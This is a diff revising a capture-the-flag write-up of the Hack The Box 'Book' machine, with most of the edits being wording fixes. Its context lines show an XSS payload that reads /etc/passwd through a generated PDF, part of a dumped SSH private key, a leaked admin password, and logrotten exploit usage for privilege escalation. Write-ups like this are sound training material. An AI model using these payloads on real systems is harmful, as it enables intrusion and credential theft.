@@ -4,7 +4,7 @@
 
 ![](../.gitbook/assets/1-book-infocard.png)
 
-A medium Linux box that tested x...and taught me x...
+A medium Linux box that was fairly straightforward, but still challenging enough to teach some interesting use cases for 'standard' attacks.
 
 ## Useful Skills and Tools
 
@@ -241,7 +241,7 @@ This time only the word 'test' was written to the pdf!  The XSS vulnerability wa
 
 ### Local File Inclusion \(LFI\) through XSS - Cross Site Scripting
 
-the pdf that is uploaded to the site can be downloaded through the link in the Collections PDF, but the pdf output the admin portal collections page makes is dynamically projected HTML placed into a table. This can be exploited with javascript to do XSS. I decided the next thing I needed to do was to try to get a list of  usernames by downloading`/etc/passwd`.  My next request contained the following JavaScript in the title field:
+the pdf that is uploaded to the site can be downloaded through the link in the Collections PDF, but the pdf output the admin portal collections page makes is dynamically projected HTML placed into a table. This can be exploited with JavaScript to do XSS. I decided the next thing I needed to do was to try to get a list of  usernames by downloading`/etc/passwd`.  My next request contained the following JavaScript in the title field:
 
 ```text
 <script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
@@ -295,7 +295,7 @@ nkeaf9obYKsrORVuKKVNFzrWeXcVx+oG3NisSABIprhDfKUSbHzLIR4=
 -----END RSA PRIVATE KEY-----
 ```
 
-Opening the PDF file in Firefox resulted in the same view, but when I used `ctrl-a`, `ctrl-c` to copy all of the text I was able to copy everything.  For some reason the text was being truncated on the side, and in the default Kali pdf reader it was inaccessible.  Opening it in a browser allowed the HTML embedded in the PDF file to be copied, which in this case included the whole SSH key.  
+Opening the PDF file in Firefox resulted in the same view, but when I used `ctrl-a`, `ctrl-c` to copy all of the text I was able to copy everything.  For some reason the text was being truncated on the side, and in the default Kali PDF reader it was inaccessible.  Opening it in a browser allowed the HTML embedded in the PDF file to be copied, which in this case included the whole SSH key.  
 
 Also, as always remember to run `chmod 600 <key_file>` before using SSH keys to log in.
 
@@ -401,18 +401,9 @@ drwx------ 2 reader reader    4096 Nov 28  2019 .ssh
 -rw------- 1 reader reader    1639 Jun  7 17:45 .viminfo
 ```
 
-Using pspy to check running processes I found this interesting line: `2020/06/07 17:08:01 CMD: UID=0 PID=16535 | mysql book -e delete from users where email='admin@book.htb' and password<>'Sup3r_S3cur3_P455';`
+While using [pspy](https://github.com/DominicBreuker/pspy) to monitor running processes I found this interesting line: `2020/06/07 17:08:01 CMD: UID=0 PID=16535 | mysql book -e delete from users where email='admin@book.htb' and password<>'Sup3r_S3cur3_P455';`
 
 It looked to me like a script \(probably in a cron job\) that was resetting the password of the admin account I had used to get in.  I tried this password on the root account hoping it would let me in, but no dice.
-
-```text
-root     120188  0.5  0.2  46832  6000 pts/1    Ss+  01:33   0:00 ssh -i .ssh/id_rsa localhost
-root     120192  0.0  0.3 107984  7140 ?        Ss   01:33   0:00 sshd: root@pts/2
-```
-
-`2020/06/07 17:08:30 CMD: UID=0 PID=16773 | /usr/sbin/logrotate -f /root/log.cfg`
-
-So the system was indeed running `logrotate`. Time to test out this exploit to see if I could escalate privileges to root.
 
 ```text
 # see "man logrotate" for details
@@ -437,7 +428,9 @@ include /etc/logrotate.d
 
 ```
 
-Inside `/etc/logrotate.conf` I found that the "create" option had been set
+Inside `/etc/logrotate.conf` I found that the "create" option had been set.  Only 
+
+After running pspy for awhile, this entry showed up: `2020/06/07 17:08:30 CMD: UID=0 PID=16773 | /usr/sbin/logrotate -f /root/log.cfg.` So the system was indeed running `logrotate`., and it was loading  Time to test out this exploit to see if I could escalate privileges to root.
 
 ### Getting a root shell
 
@@ -463,7 +456,7 @@ From the exploit writer at [https://github.com/whotwagner/logrotten](https://git
 > ./logrotten -p ./payloadfile -c -s 4 /tmp/log/pwnme.log
 > ```
 
-Based on my enumeration I found that all of the conditions for vulnerability to this exploit were met, except for one thing.  I could not find any configuration files related to `logrotate` that mentioned `access.log` in the `/home/reader/backups` folder.  I decided to go ahead and try it anyway since it still looked like a likely approach.  I created a payload that would get me root access, and ran the exploit.
+Based on my enumeration I found that all of the conditions for vulnerability to this exploit were met, except for one thing.  I could not find any configuration files related to `logrotate` that mentioned `access.log` in the `/home/reader/backups` folder.  I decided to go ahead and try it anyway since it still looked like a likely approach.  I created a payload that would hopefully get me root access, and ran the exploit.
 
 ```text
 #!/bin/bash
@@ -584,7 +577,7 @@ root@book:~# cat log.cfg
 
 Mystery solved!
 
-Thanks to [`MrR3boot`](https://www.hackthebox.eu/home/users/profile/13531) for &lt;something interesting or useful about this machine.
+Thanks to [`MrR3boot`](https://www.hackthebox.eu/home/users/profile/13531) for creating a machine that had some new and interesting routes to gain privileges.  I definitely liked how there were few to no rabbit holes to lose myself in!
 
 If you like this content and would like to see more, please consider supporting me through Patreon at [https://www.patreon.com/zweilosec](https://www.patreon.com/zweilosec).
 
